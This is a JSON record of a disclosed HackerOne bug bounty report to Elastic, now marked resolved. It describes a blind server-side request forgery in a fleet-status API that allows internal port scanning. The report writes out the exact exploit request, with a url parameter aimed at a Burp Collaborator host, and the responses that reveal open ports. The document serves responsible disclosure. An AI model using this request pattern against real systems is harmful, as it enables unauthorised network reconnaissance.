{
  "id": 1300585,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzAwNTg1",
  "url": "https://hackerone.com/reports/1300585",
  "title": "blind Server-Side Request Forgery (SSRF)  allows scanning internal ports",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2021-08-11T19:08:49.124Z",
  "submitted_at": "2021-08-11T19:08:49.267Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "lu3ky-13",
    "url": "/lu3ky-13",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/yfaq6wngr5hs7thv42ci3jw42d6l/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23607,
    "url": "https://hackerone.com/elastic",
    "handle": "elastic",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/607/c5cce6a2e2d95af85e014db95c2d7560e73e9bec_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/607/c5cce6a2e2d95af85e014db95c2d7560e73e9bec_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Elastic",
      "twitter_handle": "elastic",
      "website": "https://www.elastic.co/",
      "about": "Smarter search. Stronger security. Seamless observability. Uncover real-time insights with Search AI."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": true,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2023-05-05T06:34:31.254Z",
  "bug_reporter_agreed_on_going_public_at": "2023-04-05T06:34:30.070Z",
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "hello dear support \n\nI found a Blind SSRF issue that allows scanning internal ports. on https://fleet-status.app.elstc.co\n\nfrom this issue, you can check the server port \n\nHTTP request\n===========\nGET /api/v1/http/default/raw?regex=%22service.name%22:/s*%22(package-registry)%22&statusCodeMax=200&statusCodeMin=200&url=http://p8yfvg6nige7z2ndagpf3v181z7pve.burpcollaborator.net:22 HTTP/1.1\nHost: fleet-status.app.elstc.co\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: none\nSec-Fetch-User: ?1\nCache-Control: max-age=0\nTe: trailers\nConnection: close\n\nif you add port 22 you will get  \n\n{\"type\":\"HTTP-RAW\",\"status\":\"WARNING\",\"label\":\"http://p8yfvg6nige7z2ndagpf3v181z7pve.burpcollaborator.net:22\",\"message\":\"timeout/host unreachable\"}\n\n\nnot open  \n\nif you add  port 80 \n\nresponse \n{\"type\":\"HTTP-RAW\",\"status\":\"FAILURE\",\"label\":\"http://p8yfvg6nige7z2ndagpf3v181z7pve.burpcollaborator.net:80\",\"value\":{\"values\":[\"\\u003chtml\\u003e\\u003cbody\\u003eift3z4lojdng3fv7r68q5szjigz\\u003c/body\\u003e\\u003c/html\\u003e\"],\"unit\":\"RAW\"}}\n\nport 80 open\n\n## Impact\n\nSince this is a blind SSRF, it is not possible to read the response of HTTP requests. However this vulnerability can be used for reconnaissance.\nExample: Port Scan by measuring response time",
  "weakness": {
    "id": 68,
    "name": "Server-Side Request Forgery (SSRF)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2023-05-05T06:34:30.178Z",
  "allow_singular_disclosure_after": -75133755.7230901,
  "singular_disclosure_allowed": true,
  "vote_count": 47,
  "voters": [
    "aboalezz",
    "loaymorad",
    "dd_06",
    "tinmo",
    "todayisnew-",
    "zy9ard3",
    "shreyaschavhan",
    "bl4de",
    "glyptho",
    "shubham_srt",
    "and 37 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 6.7,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "changed",
      "confidentiality": "low",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 438735,
    "asset_type": "DOWNLOADABLE_EXECUTABLES",
    "asset_identifier": "Fleet Server",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
